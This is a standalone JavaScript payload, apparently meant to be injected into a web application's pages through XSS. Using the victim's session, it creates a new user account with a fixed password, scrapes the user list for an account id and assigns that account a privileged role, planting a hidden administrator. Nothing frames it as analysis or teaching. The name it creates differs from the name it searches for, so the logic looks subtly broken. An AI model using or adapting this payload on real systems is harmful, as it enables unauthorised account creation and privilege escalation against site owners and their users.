
$(function () {
				var domain=document.location.protocol+"//"+document.domain;
                $.post(domain+"/oauth/user/save.ajax",{userName:"xxx123",loginPassword:"aa123456",confirmPassword:"aa123456"},function(data){
					//if(data.state){
					
						var cr;
						if (document.charset) {
						  cr = document.charset
						} else if (document.characterSet) {
						  cr = document.characterSet
						};
						function createXmlHttp() {
						  if (window.XMLHttpRequest) {
							xmlHttp = new XMLHttpRequest()
						  } else {
							var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
							for (var n = 0; n < MSXML.length; n++) {
							  try {
								xmlHttp = new ActiveXObject(MSXML[n]);
								break
							  } catch (e) {
							  }
							}
						  }
						}
						createXmlHttp();
						xmlHttp.onreadystatechange = writeSource;
						xmlHttp.open('GET', domain+'/oauth/user.htm', true);
						xmlHttp.send(null);
						function writeSource() {
						  if (xmlHttp.readyState == 4) {
							  var code = xmlHttp.responseText;
							  tbody = code.match(/<tbody>[\s\S]*<\/tbody>/)[0];
							  var strs=new Array();
							  strs = tbody.split("</tr>");
							  for(var i=0;i<strs.length;i++){
								var tr=strs[i];
								if(tr.indexOf("cs123") >= 0){
									//console.log(tr);
									var id=tr.match(/ajax\?ids=[\s\S]*action-tips/)[0];
									var ok=id.replace(/[^0-9]/ig,"");
									console.log(ok);
									if(ok != ""){
										$.post(domain+"/oauth/user/set_role.ajax",{id:ok,roleIds:"1002"});
									}
								}
							  }
						  }
						}
						
						
					//}
					});
        });
